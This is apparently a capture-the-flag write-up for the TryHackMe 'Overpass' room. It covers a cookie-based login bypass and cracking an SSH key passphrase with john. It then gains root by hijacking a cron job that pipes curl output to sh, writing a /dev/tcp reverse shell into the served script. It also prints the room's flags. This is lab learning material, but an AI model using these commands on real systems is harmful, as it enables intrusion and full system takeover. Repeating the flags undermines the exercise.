# Overpass
`url = https://tryhackme.com/room/overpass`
`date = 05/20/2023`
`export IP='10.10.199.17'`

---

## Enumeration

1. **Network Enumeration**

* We can see ports `80` & `22` open on the machine. This is indicative of the fact that I will probably need to find a way to ssh into this machine after enumerating the website hosted on port `80`.

2. **Source Code Analysis**

* The source code is available at `/downloads` directory on the website.

* It is written in GoLang. It is a password manager that works by ROT47 encryption. It stores the passwords in the home directory of the user after encoding it.

* The source code is useless, unless we get access to the machine. However, you can source your own over-pass executable using the build script that is provided as well as the source code that has been downloaded.

2. **Directory Bruteforcing**

* We see the following directories on the website:
```bash
/admin.html
/downloads
/main.js
/login.js
```
* The `/admin.html` page is where the login page is there. The problem with this page can be seen in the following lines of code:

```javascript
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```
* Notice how the `SessionToken` is litereally set to nothing. Traditionally, the function `Cookies.set()` takes the `type`, `value` & then the other parameters. Here, since the value is set to nothing, we can directly set the cookies to:

```bash
curl http://overpass.thm/api/login -X POST -b "SessionToken=anything"
```

## Exploitation

* We can see the key on the admin page by sending the curl request. It might not work, so call raghav.

* Upon login, we see the private key, which we can save as id_rsa as well as process it:

```bash
chmod 600 id_rsa
ssh2john id_rsa > forJohn
john --wordlist=/usr/share/wordlists/rockyou.txt --format=SSH forJohn
# The cracked password is james13
```
Finally, we can ssh into the system.

## Post Exploitation

1. **User Flag** - The `user.txt` can be found in the `/home/james/` directory. Which can then be catted out - `thm{65c1aaf000506e56996822c6281e6bf7}`

2. **Pirv Esc**
* Can be done by manually searching through weaknesses.
* Two main things to know - `/etc/hosts` is world writeable.
```bash
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
```

Also, there is a cron tab that curls to a web address that has a shell script & pipes it to the bash command.


```bash
 * * * * * root curl overpass.thm/downloads/src/buildscript.sh | sh
```

* This crontab is run by root. Thus, adding the attacker's IP to the `/etc/hosts` file as `overpass.thm` and then running a python server locally with the file structure `./downloads/buildscript.sh` should do the trick. I am going to add a reverse shell in this file on my machine.

3. **Root Flag**
* On the attack machine:
```bash
mkdir -p ./downloads/src/
echo "sh -i >& /dev/tcp/10.6.36.128/1235 0>&1" >> ./downloads/src/buildscript.sh
sudo python3 -m http.server 80
```

* On the victim machine:
```bash
echo "10.6.36.128 overpass.thm" >> /etc/hosts
```
* We should be receiving the shell in about a a minute becuse this script runs every minute, from the victim machine.

*Note -- make sure that the directory & any sub-directories that the victim is curling, has perms 777 in orderfor this to work.*

* The root flag can be found in the `/root` directory which can then be catted out - `thm{7f336f8c359dbac18d54fdd64ea753bb}`

fin.